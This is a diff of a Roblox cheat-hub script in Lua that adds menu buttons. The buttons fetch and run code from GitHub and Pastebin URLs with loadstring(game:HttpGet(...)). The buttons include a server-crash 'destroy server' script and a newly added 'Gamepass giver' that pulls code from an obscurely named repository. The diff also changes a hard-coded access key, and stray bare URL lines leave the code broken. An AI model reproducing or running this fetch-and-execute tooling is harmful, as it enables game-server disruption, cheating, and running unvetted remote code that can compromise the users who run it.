@@ -1,4 +1,7 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+https://raw.githubusercontent.com/hjfjvfnwoxsmkcnf/fjqokdmv9ejsndFF948/main/jansnbfuje
+
 local Player = game.Players.LocalPlayer
 local plrname = Player.name
 https://raw.githubusercontent.com/hjfjvfnwoxsmkcnf/fjqokdmv9ejsndFF948/main/gfhfdhvcjje
@@ -19,7 +22,7 @@ OrionLib:MakeNotification({
 	Image = "rbxassetid://4483345998",
 	Time = 5
 })
-_G.Key = "HALLOWEEN2022"
+_G.Key = "NEWUPDOCTOBER"
 _G.KeyInput = "string"
 _G.PremiumKey = "TYFORSUP"
 
@@ -42,6 +45,12 @@ Tab:AddButton({
 	Name = "Crash Scripts: Script for destroy server",
 	Callback = function()
 		loadstring(game:HttpGet("https://pastebin.com/raw/ptpKWPrJ"))()
+  	end
+})
+Tab:AddButton({
+	Name = "Gamepass giver: Ultimate Gamepass",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/hjfjvfnwoxsmkcnf/fjqokdmv9ejsndFF948/main/jansnbfuje"))()
   	end
 })
 -- PREMIUM --
@@ -268,7 +277,20 @@ local Tab = Window:MakeTab({
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
-Tab:AddParagraph("Version: 2.5 - Join discord.gg/nicosclub","Hello! Its main page, i wanna say you no more info - Contacts: TG-@xKralTRx0. Contact if u wanna buy full script or searched bug/error")
+Tab:AddParagraph("Join discord.gg/nicosclub","Hello! Its main page, i wanna say you no more info - Contacts: TG-@xKralTRx0. Contact if u wanna buy full script or searched bug/error")
+-- TEST SCRIPT --
+local Tab = Window:MakeTab({
+	Name = "Testing premium",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+Tab:AddButton({
+	Name = "Gamepass giver: Ultimate Gamepass",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/hjfjvfnwoxsmkcnf/fjqokdmv9ejsndFF948/main/jansnbfuje"))()
+  	end
+})
+-- TEST SCRIPT --
 -- PET SIM X --
 local Tab = Window:MakeTab({
 	Name = "Pet Sim X",
